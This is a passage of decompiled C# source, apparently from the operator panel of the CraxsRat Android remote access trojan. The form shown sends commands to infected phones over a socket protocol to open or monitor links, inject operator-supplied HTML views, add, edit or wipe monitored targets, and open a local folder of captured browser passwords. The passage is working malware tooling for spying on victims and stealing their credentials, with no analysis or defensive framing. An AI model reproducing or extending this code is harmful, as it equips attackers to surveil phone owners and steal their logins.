		if (!string.IsNullOrEmpty(TargetLink.Text) && !string.IsNullOrEmpty(TargetLink.Text))
		{
			string[] array = Classclient.Keys.Split(':');
			int num = 0;
			int num2 = 0;
			string text = "";
			if (Operators.CompareString(DrakeUIComboBox1.Text.ToLower(), "just open".ToLower(), TextCompare: false) == 0)
				statustext.Text = "Request Sent";
			else
			{
				text = "mon<*>";
				statustext.Text = "Starting Monitoring , Please Wait...";
			}
			object[] parametersObjects = new object[4]
			{
				Classclient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + text + reso.ChekLink(TargetLink.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
		else
			CraxsAlert.ShowWarning("Enter Link First !!!");
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry(object sender, EventArgs e)
	{
		DrakeUIComboBox1.Text = "just open";
		try
		{
			ClientPic.Image = Classclient.Wallpaper;
			clinameinfo.Text = "Name: " + Classclient.ClientName + Strings.Space(2) + "IP: " + Classclient.ClientAddressIP + Strings.Space(2) + "Country: " + Classclient.Country;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		translateme();
		try
		{
			if (!Directory.Exists(Classclient.FolderUSER + "\\Browser_CAP"))
				Directory.CreateDirectory(Classclient.FolderUSER + "\\Browser_CAP");
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError2);
			//////CraxsAlert.Showinformation("Sorry");
		}
		BWloader.RunWorkerAsync();
	}

	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				Mytitle.Text = Codes.Translate(Mytitle.Text, "en", "ar");
				openbtn.Text = Codes.Translate(openbtn.Text, "en", "ar");
				Label2.Text = Codes.Translate(Label2.Text, "en", "ar");
				//Label3.Text = Codes.Translate(Label3.Text, "en", "ar");
				clrbtn.Text = Codes.Translate(clrbtn.Text, "en", "ar");
				savbtn.Text = Codes.Translate(savbtn.Text, "en", "ar");
				cpybtn.Text = Codes.Translate(cpybtn.Text, "en", "ar");
				refbtn.Text = Codes.Translate(refbtn.Text, "en", "ar");
				commndbtn.Text = Codes.Translate(commndbtn.Text, "en", "ar");
				linkspanel.Text = Codes.Translate(selecthtmlbtn.Text, "en", "ar");
				datapanel.Text = Codes.Translate(datapanel.Text, "en", "ar");
				selecthtmlbtn.Text = Codes.Translate(selecthtmlbtn.Text, "en", "ar");
				tabcontrols.TabPages[0].Text = Codes.Translate(tabcontrols.TabPages[0].Text, "en", "ar");
				tabcontrols.TabPages[1].Text = Codes.Translate(tabcontrols.TabPages[1].Text, "en", "ar");
				tabcontrols.TabPages[2].Text = Codes.Translate(tabcontrols.TabPages[2].Text, "en", "ar");
			}
		}
		else
		{
			Mytitle.Text = Codes.Translate(Mytitle.Text, "en", "zh");
			openbtn.Text = Codes.Translate(openbtn.Text, "en", "zh");
			Label2.Text = Codes.Translate(Label2.Text, "en", "zh");
			//Label3.Text = Codes.Translate(Label3.Text, "en", "zh");
			clrbtn.Text = Codes.Translate(clrbtn.Text, "en", "zh");
			savbtn.Text = Codes.Translate(savbtn.Text, "en", "zh");
			cpybtn.Text = Codes.Translate(cpybtn.Text, "en", "zh");
			refbtn.Text = Codes.Translate(refbtn.Text, "en", "zh");
			commndbtn.Text = Codes.Translate(commndbtn.Text, "en", "zh");
			selecthtmlbtn.Text = Codes.Translate(selecthtmlbtn.Text, "en", "zh");
			linkspanel.Text = Codes.Translate(linkspanel.Text, "en", "zh");
			datapanel.Text = Codes.Translate(datapanel.Text, "en", "zh");
			tabcontrols.TabPages[0].Text = Codes.Translate(tabcontrols.TabPages[0].Text, "en", "zh");
			tabcontrols.TabPages[1].Text = Codes.Translate(tabcontrols.TabPages[1].Text, "en", "zh");
			tabcontrols.TabPages[2].Text = Codes.Translate(tabcontrols.TabPages[2].Text, "en", "zh");
		}
	}

	private void Vsbar_ValueChanged(object sender, EventArgs e)
	{
		try
		{
			if (vewimage.Image != null)
			{
				y = (sender as DrakeUIScrollBar).Value;
				vewimage.Refresh();
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void Vewimage_Paint(object sender, PaintEventArgs e)
	{
	}

	private void BWloader_DoWork(object sender, DoWorkEventArgs e)
	{
		try
		{
			if (Classclient != null)
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>l<*>" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwashgys(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = "C:\\";
			openFileDialog.Title = "Selecte HTML Files (.html)";
			openFileDialog.Filter = "html Files|*.html";
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				string fileName = openFileDialog.FileName;
				DialogResult dialogResult2 = MessageBox.Show("Send This View ?", "Confirm", MessageBoxButtons.YesNo);
				if (dialogResult2 == DialogResult.Yes)
				{
					TcpClient myClient = Classclient.myClient;
					string[] array = Classclient.Keys.Split(':');
					string text = Conversions.ToString(Codes.BSEN(File.ReadAllText(fileName)));
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "ussd<*>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						Classclient
					};
					Classclient.SendMessage(parametersObjects);
				}
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void WebViewMonitor_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (Classclient != null)
		{
			string[] array = Classclient.Keys.Split(':');
			int num = 0;
			int num2 = 0;
			if (Operators.CompareString(DrakeUIComboBox1.Text.ToLower(), "just open".ToLower(), TextCompare: false) == 0)
				statustext.Text = "Request Sent";
			else
				statustext.Text = "Starting Monitoring , Please Wait...";
			object[] parametersObjects = new object[4]
			{
				Classclient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "bORlQeywIwrkkxg8BnzKHg==STP" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
		BWloader.Dispose();
	}

	private void Timeloader_Tick(object sender, EventArgs e)
	{
	}

	private void Namescombo_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			if (!string.IsNullOrEmpty(namescombo.Text))
			{
				string text = MapData[namescombo.Text];
				if (text != null && text.Contains(":"))
				{
					string[] array = text.Split(':');
					string text2 = namescombo.Text;
					string text3 = array[0];
					string text4 = array[1];
					nametext.Text = text2;
					linktext.Text = text3;
					idtext.Text = text4;
				}
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
	{
		if (!BWloader.IsBusy)
			BWloader.RunWorkerAsync();
	}

	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		datalogtext.Text = "";
	}

	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(datalogtext.Text))
		{
			Clipboard.SetText(datalogtext.Text);
			CraxsAlert.ShowSucess("Text Copied.");
		}
	}

	private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
	{
		if (!Directory.Exists(Classclient.FolderUSER + "\\Browser_CAP\\Passwords"))
			CraxsAlert.Showinformation("No Password Founded");
		else
			Process.Start(Classclient.FolderUSER + "\\Browser_CAP\\Passwords");
	}

	private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
	{
		switch (comandcombo.Text.ToLower())
		{
		case "clean":
			if (string.IsNullOrEmpty(namescombo.Text))
				CraxsAlert.ShowWarning("Select name to remove.");
			else if (Codes.MyMsgBox("Alert", "Are you sure you want to Clean Data For:\r\n" + namescombo.Text + " data will be removed from phone.", useno: true, Resources.information48px))
			{
				string text9 = namescombo.Text;
				string[] array3 = Classclient.Keys.Split(':');
				object[] parametersObjects3 = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>cl<*>" + text9 + Data.SPL_SOCKET + array3[0] + Data.SPL_SOCKET + array3[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects3);
			}
			break;
		case "edit":
		{
			if (string.IsNullOrEmpty(namescombo.Text))
			{
				CraxsAlert.ShowWarning("Select name to Edit.");
				break;
			}
			string text5 = nametext.Text;
			string text6 = linktext.Text;
			string text7 = "blank";
			if (!string.IsNullOrEmpty(idtext.Text))
				text7 = idtext.Text;
			string text8 = text5 + ">" + text6 + ">" + text7 + ">";
			string[] array2 = Classclient.Keys.Split(':');
			object[] parametersObjects2 = new object[4]
			{
				Classclient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>ed<*>" + text8 + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects2);
			break;
		}
		case "remove":
			if (string.IsNullOrEmpty(namescombo.Text))
				CraxsAlert.ShowWarning("Select name to remove.");
			else if (Codes.MyMsgBox("Alert", "Are you sure you want to remove\r\n" + namescombo.Text + " from monitoring list ?", useno: true, Resources.information48px))
			{
				string text10 = namescombo.Text;
				string[] array4 = Classclient.Keys.Split(':');
				object[] parametersObjects4 = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>re<*>" + text10 + Data.SPL_SOCKET + array4[0] + Data.SPL_SOCKET + array4[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects4);
			}
			break;
		case "add":
		{
			if (string.IsNullOrEmpty(nametext.Text) | string.IsNullOrEmpty(linktext.Text))
			{
				CraxsAlert.ShowWarning("Both (Name , Link) is required.");
				break;
			}
			if (comandcombo.Items.Contains(nametext.Text))
			{
				CraxsAlert.ShowWarning("this name already add.");
				break;
			}
			string text = nametext.Text;
			string text2 = linktext.Text;
			string text3 = "blank";
			if (!string.IsNullOrEmpty(idtext.Text))
				text3 = idtext.Text;
			string text4 = text + ">" + text2 + ">" + text3 + ">";
			if (Classclient == null)
				break;
			try
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>ad<*>" + text4 + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
				break;
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
				break;
			}
		}
		}
	}

    private void drakeUIAvatar2_Click(object sender, EventArgs e)
    {
        if (!BWloader.IsBusy)
            BWloader.RunWorkerAsync();
    }
}
